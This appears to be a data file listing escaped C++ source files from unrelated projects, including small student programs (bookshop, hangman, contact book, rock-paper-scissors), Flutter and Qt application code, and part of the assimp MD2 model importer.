user want to add another book or not\r\n        cout << \"Do you want to add another book? :\";\r\n        cin >> goAgain;\r\n        cout << endl;\r\n        if (toupper(goAgain)=='Y')\r\n        {\r\n            addAnotherBook=true;\r\n        }else{\r\n            addAnotherBook=false;\r\n        }   \r\n    } \r\n    while (addAnotherBook);\r\n   \r\n}\r\n\r\n\r\nvoid viewBook(){\r\n\r\n\r\n    if (bookNameList.size()>0) // check whether the book name list is empty or not\r\n    {\r\n        cout <<endl;\r\n        cout <<\"\\t\\t*********************\" << endl;\r\n        cout <<\"\\t\\t|  Nethra Book shop |\" << endl;\r\n        cout <<\"\\t\\t*********************\" << endl<< endl;\r\n        cout << \"book Name\\t\\tBook ID\\t\\t\\tPrice\" << endl<< endl;\r\n\r\n        for (int i = 0; i < bookNameList.size(); i++)\r\n        {\r\n            cout << bookNameList[i] << \"\\t\\t\\t\" << bookIDList[i] << \"\\t\\t\\t\" <<bookPriceList[i] <<\"$\"<<endl;\r\n        }\r\n        \r\n        \r\n\r\n    }else\r\n    {\r\n        cout << \" OOPS! no books to view \"<<endl;\r\n    }\r\n    \r\n\r\n}\r\n\r\nvoid searchBook(){\r\n    bool isBookFound=false;\r\n    string bookToFind;\r\n    cout<< \"Enter the book name you want to search: \";\r\n    cin >> bookToFind;\r\n    // iterate through the bookname vector to find whether the user enterd book name is included or not \r\n    for (int i = 0; i < bookIDList.size(); i++) \r\n    {\r\n        if (bookNameList[i] == bookToFind) \r\n        {\r\n            isBookFound =true;\r\n            cout << endl <<\"Book \"<<bookToFind <<\" is found\"<< endl<<endl;\r\n            cout <<\"***************************************\"<< endl;\r\n            cout << \"Book id is \"<< bookIDList[i] <<endl;\r\n            cout << \"Book name is \"<< bookNameList[i]<< endl;\r\n            cout << \"Book price is \"<< bookPriceList[i]<< \"$\"<< endl;\r\n            cout <<\"***************************************\"<<endl;\r\n        }\r\n        \r\n        \r\n    }\r\n    if (! isBookFound)\r\n    {\r\n        cout << endl<<\"OOPS! The book you entered is not found in the system\"<<endl<< \"please try again another book\"<<endl;\r\n    }    \r\n\r\n}\r\n\r\nvoid viewOrders(){\r\n    if (bookOrderIDList.size()>0)   // Check whether there are at leat one order by checking book order list size\r\n    {\r\n        cout << \"Order ID\\t\\t\\t\"<< \"ordered book count\\t\\t\"<< \"total price\"<<endl;\r\n\r\n        for (int i = 0; i < orderedBookNameList.size(); i++)\r\n        {\r\n            cout << bookOrderIDList[i]<<\"\\t\\t\\t\"<<orderedBookCountList[i]<<\"\\t\\t\"<<orderTotalList[i]<<endl;\r\n     ",
    "#include <iostream>\n#include <vector>\n\nusing namespace std;\n\nvector<int> minJumpsToEnd(int N, vector<int> &ropes)\n{\n    int maxReach = 0; // V\u1ecb tr\u00ed xa nh\u1ea5t c\u00f3 th\u1ec3 \u0111\u1ea1t \u0111\u01b0\u1ee3c t\u1eeb v\u1ecb tr\u00ed hi\u1ec7n t\u1ea1i\n    int steps = 0;    // S\u1ed1 l\u1ea7n chuy\u1ec1n\n\n    int currentEnd = 0; // \u0110i\u1ec3m k\u1ebft th\u00fac c\u1ee7a l\u1ea7n chuy\u1ec1n hi\u1ec7n t\u1ea1i\n\n    vector<int> jumps; // L\u01b0u tr\u1eef c\u00e1c v\u1ecb tr\u00ed chuy\u1ec1n\n\n    for (int i = 0; i < N - 1; ++i)\n    {\n        maxReach = max(maxReach, i + ropes[i]); // C\u1eadp nh\u1eadt v\u1ecb tr\u00ed xa nh\u1ea5t c\u00f3 th\u1ec3 \u0111\u1ea1t \u0111\u01b0\u1ee3c t\u1eeb v\u1ecb tr\u00ed hi\u1ec7n t\u1ea1i\n\n        if (maxReach == i && ropes[i] == 0)\n        {              // N\u1ebfu kh\u00f4ng th\u1ec3 ti\u1ebfn xa h\u01a1n\n            return {}; // Kh\u00f4ng th\u1ec3 \u0111\u1ebfn \u0111\u00edch, tr\u1ea3 v\u1ec1 vector r\u1ed7ng\n        }\n\n        if (i == currentEnd)\n        {                              // N\u1ebfu \u0111\u1ea1t \u0111\u01b0\u1ee3c \u0111i\u1ec3m k\u1ebft th\u00fac c\u1ee7a l\u1ea7n chuy\u1ec1n hi\u1ec7n t\u1ea1i\n            ++steps;                   // T\u0103ng s\u1ed1 l\u1ea7n chuy\u1ec1n\n            jumps.push_back(ropes[i]); // L\u01b0u v\u1ecb tr\u00ed chuy\u1ec1n v\u00e0o vector\n            currentEnd = maxReach;     // C\u1eadp nh\u1eadt \u0111i\u1ec3m k\u1ebft th\u00fac c\u1ee7a l\u1ea7n chuy\u1ec1n hi\u1ec7n t\u1ea1i\n        }\n    }\n\n    jumps.push_back(N - 1); // Th\u00eam v\u1ecb tr\u00ed cu\u1ed1i c\u00f9ng v\u00e0o vector\n    return jumps;\n}\n\nint main()\n{\n    int N;\n    cin >> N; // Nh\u1eadp kho\u1ea3ng c\u00e1ch c\u1ea7n di chuy\u1ec3n\n\n    vector<int> ropes(N);\n    for (int i = 0; i < N; ++i)\n    {\n        cin >> ropes[i]; // Nh\u1eadp \u0111\u1ed9 d\u00e0i c\u1ee7a d\u00e2y t\u1ea1i t\u1eebng v\u1ecb tr\u00ed\n    }\n\n    vector<int> minJumps = minJumpsToEnd(N, ropes);\n    if (minJumps.empty())\n    {\n        cout << \"CANNOT GET DESTINATION\" << endl; // N\u1ebfu kh\u00f4ng th\u1ec3 \u0111\u1ebfn \u0111\u00edch\n    }\n    else\n    {\n        cout << \"Duong chuyen ngan nhat: \";\n        for (int i = 0; i < minJumps.size(); ++i)\n        {\n            cout << minJumps[i] << \" \"; // In ra c\u00e1c v\u1ecb tr\u00ed chuy\u1ec1n\n        }\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "\ufeff#include <iostream>\r\n#include <cstdlib>\r\n#include <algorithm>\r\n#include <string>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nstring generateComputerChoice() {\r\n    int liczba;\r\n    string computerChoice;\r\n    srand(time(NULL));\r\n    liczba = rand() % 3 + 1;\r\n    switch (liczba) {\r\n    case 1:\r\n        computerChoice = \"rock\";\r\n        break;\r\n    case 2:\r\n        computerChoice = \"scissors\";\r\n        break;\r\n    case 3:\r\n        computerChoice = \"paper\";\r\n        break;\r\n    }\r\n    return computerChoice;\r\n}\r\n\r\nint main() {\r\n    string computerChoice = generateComputerChoice();\r\n    string userChoice;\r\n    cout << \"Wybierz (rock, paper, scissors): \";\r\n    cin >> userChoice;\r\n    transform(userChoice.begin(), userChoice.end(), userChoice.begin(), ::tolower);\r\n\r\n    cout << \"Computer chose: \" << computerChoice << endl;\r\n\r\n    if (userChoice == computerChoice) {\r\n        cout << \"It's a tie!\" << endl;\r\n    }\r\n    else if ((userChoice == \"rock\" && computerChoice == \"scissors\") ||\r\n        (userChoice == \"scissors\" && computerChoice == \"paper\") ||\r\n        (userChoice == \"paper\" && computerChoice == \"rock\")) {\r\n        cout << \"You win!\" << endl;\r\n    }\r\n    else {\r\n        cout << \"You lose!\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// Do NOT add any other includes\r\n#include \"dict.h\"\r\n\r\nDict::Dict(){\r\n    // Implement your function here    \r\n    dictionary=new SymbolTable();\r\n}\r\n\r\nDict::~Dict(){\r\n    // Implement your function here  \r\n    delete dictionary;\r\n}\r\n\r\nvoid Dict::insert_sentence(int book_code, int page, int paragraph, int sentence_no, string sentence){\r\n    // Implement your function here \r\n    int i=0;\r\n    string s=\"\";\r\n    while(i<sentence.size()){\r\n        if(  sentence[i] ==  ' ' ||sentence[i] ==  '.' || sentence[i] ==  ',' ||  sentence[i] ==  '-' || sentence[i] ==  ':' || sentence[i] ==  '!' || sentence[i] ==  '\"'  || int(sentence[i]) == 39  ||   sentence[i] == '(' || sentence[i] == ')' || sentence[i] == '?'||  sentence[i] == '[' ||  sentence[i] == ']' ||  sentence[i] == ';' ||  sentence[i] =='@'  ){\r\n            if(s==\"\"){\r\n                i++;\r\n                continue;\r\n            }else{\r\n                lower_case_conversion(s);\r\n                dictionary->insert(s);\r\n                s=\"\";\r\n            }\r\n        }else {\r\n            s+=sentence[i];\r\n        }i++;\r\n    }\r\n    if(s==\"\"){\r\n       \r\n    }else{\r\n        lower_case_conversion(s);\r\n        dictionary->insert(s);\r\n        s=\"\";\r\n    }\r\n    return;\r\n}\r\n\r\nint Dict::get_word_count(string word){\r\n    // Implement your function here\r\n    return dictionary->get_count(word);\r\n}\r\n\r\nvoid Dict::dump_dictionary(string filename){\r\n    // Implement your function here\r\n        ofstream outfile(filename,ios::app);\r\n    vector<SymNode*> stack;\r\n    SymNode* root=dictionary->get_root();\r\n    if(root==NULL) return;\r\n    stack.push_back(root);\r\n    while(stack.size()!=0) {\r\n        SymNode* itr=stack[stack.size()-1];\r\n        stack.pop_back();\r\n        outfile<<itr->key<<\", \"<<itr->occurence<<endl;\r\n        if(itr->right){\r\n            stack.push_back(itr->right);\r\n        }\r\n        if (itr->left){\r\n            stack.push_back(itr->left);\r\n        }\r\n    }\r\n    return;\r\n}\r\n// int main(){\r\n\r\n//    Dict Dictionary ;\r\n\r\n//    Dictionary.insert_sentence(1,2,3,4,\"Lucky Aditya Harshit Aryan\");\r\n\r\n//    Dictionary.dump_dictionary(\"out\");\r\n//     return 0; \r\n// }\r\n",
    "#include<iostream>\nusing namespace std;\n\nclass Base\n{\n    public:\n        int A,B;\n        Base()\n        {   \n            cout<<\"Inside Base constructor\\n\";\n            A = 11;\n            B = 21; \n        }\n        ~Base()\n        {   cout<<\"Inside Base destructor\\n\";  }\n        void Fun()\n        {   cout<<\"Inside Base fun\\n\";  }\n};\nclass Derived : public Base\n{\n    public:\n        int X,Y;\n        Derived()\n        {   \n            cout<<\"Inside Derived constructor\\n\";\n            X = 51;\n            Y = 101;    \n        }\n        ~Derived()\n        {   cout<<\"Inside Derived destructor\\n\";   }\n        void Gun()\n        {   cout<<\"Inside Derived gun\\n\";   }\n};\nclass DerivedX : public Derived\n{\n    public:\n        int P;\n        DerivedX()\n        {\n            cout<<\"Inside DerivedX constructor\\n\"; \n            P = 111; \n        }\n        ~DerivedX()\n        {   cout<<\"Inside DerivedX destructor\\n\";  }\n        void Sun()\n        {   cout<<\"Inside Derivedx Sun\\n\";  }\n};\n\nint main()\n{\n    DerivedX dobj;   // Constructor of Base  Constructor of Derived constructor of Derivedx\n    cout<<\"Size of object is : \"<<sizeof(dobj)<<\"\\n\";   // 20\n\n    cout<<dobj.A<<\"\\n\"; // 11\n    cout<<dobj.B<<\"\\n\"; // 21\n    cout<<dobj.X<<\"\\n\"; // 51\n    cout<<dobj.Y<<\"\\n\"; // 101\n    cout<<dobj.P<<\"\\n\"; // 111\n    \n    dobj.Fun();     // Base Fun\n    dobj.Gun();     // Derived Gun\n    dobj.Sun();     // Dervedx Sun\n\n    // Destructor of DervedX \n    // Destrcutor of Derived\n    // Destructor of Base\n    return 0;\n}",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2012, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms, \nwith or without modification, are permitted provided that the following \nconditions are met:\n\n* Redistributions of source code must retain the above\n  copyright notice, this list of conditions and the\n  following disclaimer.\n\n* Redistributions in binary form must reproduce the above\n  copyright notice, this list of conditions and the\n  following disclaimer in the documentation and/or other\n  materials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\n  contributors may be used to endorse or promote products\n  derived from this software without specific prior\n  written permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT \nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT \nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT \nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY \nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT \n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE \nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n\n#include \"AssimpPCH.h\"\n#ifndef ASSIMP_BUILD_NO_MD2_IMPORTER\n\n/** @file Implementation of the MD2 importer class */\n#include \"MD2Loader.h\"\n#include \"ByteSwap.h\"\n#include \"MD2NormalTable.h\" // shouldn't be included by other units\n\nusing namespace Assimp;\nusing namespace Assimp::MD2;\n\n\n// helper macro to determine the size of an array\n#if (!defined ARRAYSIZE)\n#\tdefine ARRAYSIZE(_array) (int(sizeof(_array) / sizeof(_array[0])))\n#endif \n\nstatic const aiImporterDesc desc = {\n\t\"Quake II Mesh Importer\",\n\t\"\",\n\t\"\",\n\t\"\",\n\taiImporterFlags_SupportBinaryFlavour,\n\t0,\n\t0,\n\t0,\n\t0,\n\t\"md2\" \n};\n\n// ------------------------------------------------------------------------------------------------\n// Helper function to lookup a normal in Quake 2's precalculated table\nvoid MD2::LookupNormalIndex(uint8_t iNormalIndex,aiVector3D& vOut)\n{\n\t// make sure the normal index has a valid value\n\tif (iNormalIndex >= ARRAYSIZE(g_avNormals))\t{\n\t\tDefaultLogger::get()->warn(\"Index overflow in Quake II normal vector list\");\n\t\tiNormalIndex = ARRAYSIZE(g_avNormals) - 1;\n\t}\n\tvOut = *((const aiVector3D*)(&g_avNormals[iNormalIndex]));\n}\n\n\n// ------------------------------------------------------------------------------------------------\n// Constructor to be privately used by Importer\nMD2Importer::MD2Importer()\n{}\n\n// ------------------------------------------------------------------------------------------------\n// Destructor, private as well \nMD2Importer::~MD2Importer()\n{}\n\n// ------------------------------------------------------------------------------------------------\n// Returns whether the class can handle the format of the given file. \nbool MD2Importer::CanRead( const std::string& pFile, IOSystem* pIOHandler, bool checkSig) const\n{\n\tconst std::string extension = GetExtension(pFile);\n\tif (extension == \"md2\")\n\t\treturn true;\n\n\t// if check for extension is not enough, check for the magic tokens \n\tif (!extension.length() || checkSig) {\n\t\tuint32_t tokens[1]; \n\t\ttokens[0] = AI_MD2_MAGIC_NUMBER_LE;\n\t\treturn CheckMagicToken(pIOHandler,pFile,tokens,1);\n\t}\n\treturn false;\n}\n\n// ------------------------------------------------------------------------------------------------\n// Get a list of all extensions supported by this loader\nconst aiImporterDesc* MD2Importer::GetInfo () const\n{\n\treturn &desc;\n}\n\n// ------------------------------------------------------------------------------------------------\n// Setup configuration properties\nvoid MD2Importer::SetupProperties(const Importer* pImp)\n{\n\t// The \n\t// AI_CONFIG_IMPORT_MD2_KEYFRAME option overrides the\n\t// AI_CONFIG_IMPORT_GLOBAL_KEYFRAME option.\n\tconfigFrameID = pImp->GetPropertyInteger(AI_CONFIG_IMPORT_MD2_KEYFRAME,-1);\n\tif(static_cast<unsigned int>(-1) == configFrameID){\n\t\tconfigFrameID = pImp->GetPropertyInteger(AI_CONFIG_IMPORT_GLOBAL_KEYFRAME,0);\n\t}\n}\n// ------------------------------------------------------------------------------------------------\n// Validate the file header\nvoid MD2Importer::ValidateHeader( )\n{\n\t// check magic number\n\tif (m_pcHeader->magic != AI_MD2_MAGIC_NUMBER_BE &&\n\t\tm_pcHeader->magic != AI_MD2_MAGIC_NUMBER_LE)\n\t{\n\t\tchar szBuffer[5];\n\t\tszBuffer[0] = ((char*)&m_pcHeader->magic)[0];\n\t\tszBuffer[1] = ((char*)",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MenuWidget.h\"\n#include<QPixmap>\n#include \"ButtonClickSound.h\"\n\nMenuWidget::MenuWidget(QWidget* parent)\n\t: QWidget(parent), settingsWidget(new SettingsWidget(parent)), \n\tplayWidget(nullptr),confirmDialog(new ConfirmDialog(parent))\n{\n\tui.setupUi(this);\n\tinitBackgroundGIF();\n\tinitLogoGIF();\n\n\tsetWindowTitle(\"Meolide\");\n\n\t// SongComboBox related\n\tinitSongComboBox();\n\tconnect(ui.comboBox_song, &QComboBox::currentTextChanged, this, &MenuWidget::comboBoxSongSelected);\n\n\t// connect SettingsWidget related\n\tconnect(ui.pushButton_settings, &QPushButton::clicked, this, [this]()\n\t\t{\n\t\t\tsettingsWidget->show();\n\t\t\tthis->hide();\n\t\t});\n\n\tconnect(settingsWidget, &SettingsWidget::pushButtonBackMenuClicked, this, &MenuWidget::show);\n\n\t// connect PlayWidget related\n\tconnect(ui.pushButton_play, &QPushButton::clicked, this, &MenuWidget::pushButtonPlayClicked);\n\n\t//connect confirmDialog related\n\t//connect(confirmDialog, &ConfirmDialog::backToMenu, this,&MenuWidget::show);\n\tconnect(confirmDialog, &ConfirmDialog::exitGame, this, &MenuWidget::close);\n\n\t//connect buttonClickSound\n\tButtonClickSound::buttonClickSound(ui.pushButton_settings);\n\tButtonClickSound::buttonClickSound(ui.pushButton_play);\n\tButtonClickSound::buttonClickSound(ui.comboBox_chart); \n\tButtonClickSound::buttonClickSound(ui.comboBox_song);\n}\n\nMenuWidget::~MenuWidget()\n{\n\tdelete settingsWidget;\n\tdelete playWidget;\n\tdelete backgroundGIF;\n}\n\nvoid MenuWidget::initSongComboBox()\n{\n\tbeatmapDir = QDir::currentPath() + \"/beatmap\";\n\tQStringList beatmapFilters;\n\tbeatmapFilters << \"*\";\n\tQDir::Filters beatFilter = QDir::Dirs | QDir::NoDotAndDotDot;\n\tQStringList beatmapSubDirs = beatmapDir.entryList(beatmapFilters, beatFilter);\n\tfor(auto &beatmap: beatmapSubDirs)\n\t{\n\t\tqDebug() << beatmap;\n\t}\n\tui.comboBox_song->addItem(\"[Select Song]\");\n\tui.comboBox_song->addItems(beatmapSubDirs);\n\tui.comboBox_song->setCurrentText(\"[Select Song]\");\n}\n\nvoid MenuWidget::initBackgroundGIF()\n{\n\tbackgroundGIF = new QMovie(\"./res/background/menu.gif\");\n\tbackgroundGIF->setScaledSize(this->size());\n\tui.background->setMovie(backgroundGIF);\n\tbackgroundGIF->start();\n}\n\nvoid MenuWidget::initLogoGIF()\n{\n\tlogoGIF=new QMovie(\"./res/icon/logo.gif\");\n\tlogoGIF->setScaledSize(ui.logo->size());\n\tui.logo->setMovie(logoGIF);\n\tlogoGIF->start();\n}\n\nvoid MenuWidget::keyPressEvent(QKeyEvent* event)\n{\n\tif (event->key() == Qt::Key_Escape)\n\t{\n\t\tqDebug() << \"Escape key pressed!\";\n\t\t// confirm to close the window by escape key\n\t\t//ConfirmDialog confirmDialog(this);\n\t\t\n\t\tif (confirmDialog->exec() == QDialog::Accepted)\n\t\t{\n\t\t\tevent->accept();\n\t\t}\n\t\telse\n\t\t{\n\t\t\tevent->ignore();\n\t\t}\n\t}\n\telse\n\t{\n\t\t//do nothing\n\t\treturn QWidget::keyPressEvent(event);\n\t}\n}\n\nvoid MenuWidget::comboBoxSongSelected(const QString& songName)\n{\n\t// Update chart comboBox\n\tui.comboBox_chart->clear();\n\tui.comboBox_chart->addItem(\"[Select Chart]\");\n\tui.comboBox_chart->setCurrentText(\"[Select Chart]\");\n\tQStringList chartFilters;\n\tchartFilters << \"*.txt\";\n\tsongDir = beatmapDir.path() + \"/\" + songName;\n\tQStringList chartFiles = songDir.entryList(chartFilters, QDir::Files);\n\tfor(auto &chart: chartFiles)\n\t{\n\t\tint suffixPos = chart.lastIndexOf(\".txt\");\n\t\tchart = chart.left(suffixPos);\n\t\tqDebug() << chart;\n\t}\n\tui.comboBox_chart->addItems(chartFiles);\n\n\t// Update song picture\n\tif (ui.comboBox_song->currentText() == \"[Select Song]\")\n\t{\n\t\tui.songPicture->clear();\n\t\treturn;\n\t}\n\tQStringList songPicFilters;\n\tsongPicFilters << \"*.jpg\" << \"*.png\";\n\tQString songPicName = songDir.entryList(songPicFilters, QDir::Files).at(0);\n\tQString songPicPath = songDir.path() + \"/\" + songPicName;\n\tQPixmap songPic(songPicPath);\n\tsongPic = songPic.scaled(ui.songPicture->size(), Qt::KeepAspectRatio, Qt::SmoothTransformation);\n\tui.songPicture->setPixmap(songPic);\n}\n\nvoid MenuWidget::pushButtonPlayClicked()\n{\n\t// Check if song and chart are selected\n\tif (ui.comboBox_song->currentText() == \"[Select Song]\" ||\n\t\tui.comboBox_chart->currentText() == \"[Select Chart]\")\n\t{\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t// Update songFile and chartFile\n\t\tQStringList songFileFilters;\n\t\tsongFileFilters << \"*.mp3\" << \"*.ogg\" << \"*.wav\" << \"*.flac\" << \"*.m4a\";\n\t\tQString songFileName = songDir.entryList(songFileFilters, QDir::Files).at(0);\n\t\tsongFilePath = songDir.path() + \"/\" + songFileName;\n\t\tchartFilePath = songDir.path() + \"/\" + ui.comboBox_chart->currentText() + \".txt\";\n\t\tqDebug() << songFilePath << \"\\n\" << chartFilePath;\n\n\t\t// Initialize PlayWidget\n\t\tif (playWidget != nullptr)\n\t\t{\n\t\t\tdelete playWidget;\n\t\t\tplayWidget = nullptr;\n\t\t}\n\t\tplayWidget = new PlayWidget(songFilePath, chartFilePath, settingsWidget);\n\t\tconnect(playWidget, &PlayWidget::signalBackMenu, this, &MenuWidget::show);\n\t\tplayWidget->resize(this->size());\n\t\tplayWidget->show();\n\t\tthis->hide();\n\t}\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"carousel_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <string>\n\nusing namespace std;\n\nstruct Contacto {\n\tstring nombre;\n\tstring telefono;\n\tstring email;\n};\n\nclass Agenda {\nprivate:\n\tvector<Contacto> contactos;\n\t\npublic:\n\tvoid agregarContacto() {\n\t\tContacto nuevoContacto;\n\t\tcout << \"Nombre: \";\n\t\tgetline(cin, nuevoContacto.nombre);\n\t\tcout << \"Tel\u00e9fono: \";\n\t\tgetline(cin, nuevoContacto.telefono);\n\t\tcout << \"Email: \";\n\t\tgetline(cin, nuevoContacto.email);\n\t\tcontactos.push_back(nuevoContacto);\n\t\tcout << \"Contacto agregado con \u00e9xito.\\n\";\n\t}\n\t\n\tvoid buscarContacto() {\n\t\tstring nombre;\n\t\tcout << \"Ingrese el nombre a buscar: \";\n\t\tgetline(cin, nombre);\n\t\tauto it = find_if(contactos.begin(), contactos.end(),\n\t\t\t\t\t\t  [&nombre](const Contacto& c) { return c.nombre == nombre; });\n\t\tif (it != contactos.end()) {\n\t\t\tcout << \"Contacto encontrado:\\n\";\n\t\t\tcout << \"Nombre: \" << it->nombre << \"\\n\";\n\t\t\tcout << \"Tel\u00e9fono: \" << it->telefono << \"\\n\";\n\t\t\tcout << \"Email: \" << it->email << \"\\n\";\n\t\t} else {\n\t\t\tcout << \"Contacto no encontrado.\\n\";\n\t\t}\n\t}\n\t\n\tvoid actualizarContacto() {\n\t\tstring nombre;\n\t\tcout << \"Ingrese el nombre del contacto a actualizar: \";\n\t\tgetline(cin, nombre);\n\t\tauto it = find_if(contactos.begin(), contactos.end(),\n\t\t\t\t\t\t  [&nombre](const Contacto& c) { return c.nombre == nombre; });\n\t\tif (it != contactos.end()) {\n\t\t\tcout << \"Ingrese la nueva informaci\u00f3n:\\n\";\n\t\t\tcout << \"Tel\u00e9fono: \";\n\t\t\tgetline(cin, it->telefono);\n\t\t\tcout << \"Email: \";\n\t\t\tgetline(cin, it->email);\n\t\t\tcout << \"Contacto actualizado con \u00e9xito.\\n\";\n\t\t} else {\n\t\t\tcout << \"Contacto no encontrado.\\n\";\n\t\t}\n\t}\n\t\n\tvoid mostrarContactos() {\n\t\tif (contactos.empty()) {\n\t\t\tcout << \"La agenda est\u00e1 vac\u00eda.\\n\";\n\t\t\treturn;\n\t\t}\n\t\tsort(contactos.begin(), contactos.end(),\n\t\t\t [](const Contacto& a, const Contacto& b) { return a.nombre < b.nombre; });\n\t\tcout << \"Lista de contactos:\\n\";\n\t\tfor (const auto& contacto : contactos) {\n\t\t\tcout << \"Nombre: \" << contacto.nombre << \"\\n\";\n\t\t\tcout << \"Tel\u00e9fono: \" << contacto.telefono << \"\\n\";\n\t\t\tcout << \"Email: \" << contacto.email << \"\\n\";\n\t\t\tcout << \"------------------------\\n\";\n\t\t}\n\t}\n};\n\nint main() {\n\tAgenda agenda;\n\tint opcion;\n\t\n\tdo {\n\t\tcout << \"\\nAgenda de Contactos\\n\";\n\t\tcout << \"1. Agregar contacto\\n\";\n\t\tcout << \"2. Buscar contacto\\n\";\n\t\tcout << \"3. Actualizar contacto\\n\";\n\t\tcout << \"4. Mostrar todos los contactos\\n\";\n\t\tcout << \"0. Salir\\n\";\n\t\tcout << \"Elija una opci\u00f3n: \";\n\t\tcin >> opcion;\n\t\tcin.ignore();  // Limpiar el buffer de entrada\n\t\t\n\t\tswitch (opcion) {\n\t\tcase 1:\n\t\t\tagenda.agregarContacto();\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tagenda.buscarContacto();\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tagenda.actualizarContacto();\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tagenda.mostrarContactos();\n\t\t\tbreak;\n\t\tcase 0:\n\t\t\tcout << \"Gracias por usar la agenda. \u00a1Hasta luego!\\n\";\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Opci\u00f3n no v\u00e1lida. Intente de nuevo.\\n\";\n\t\t}\n\t} while (opcion != 0);\n\t\n\treturn 0;\n}\n",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <time.h>\r\n#include <stdlib.h>\r\n#include <windows.h>\r\nusing namespace std;\r\n\r\nbool win = false;\r\n\r\n// Random word based on the level\r\nstring RandomWord(int level) {\r\n    srand(time(0));\r\n\tint random_line;\r\n    if (level == 1)\r\n\t\trandom_line = (rand() % 100) + 1; //line between 1-100\r\n\r\n\tif (level == 2)\r\n\t\trandom_line = (rand() % 100) + 101; //line between 101-200\r\n\tif (level == 3)\r\n\t\trandom_line = (rand() % 100) + 201; //line between 201-300\r\n\tint line_no = 1;\r\n\tstring line, word;\r\n\tifstream file(\"words.txt\");\r\n\twhile (getline(file, line))\r\n\t{\r\n\t\tif (random_line == line_no)\r\n\t\t{\r\n\t\t\tword = line;\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tline_no++;\r\n\t}\r\n\treturn word;\r\n}\r\n\r\nvoid Hangman(int turns){\r\n\tswitch (turns)\r\n\t{\r\n\tcase 0:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|       /|\\\\\" << endl;\r\n\t\tcout << \"\\t|        |\" << endl;\r\n\t\tcout << \"\\t|       / \\\\\" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\r\n\tcase 1:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" 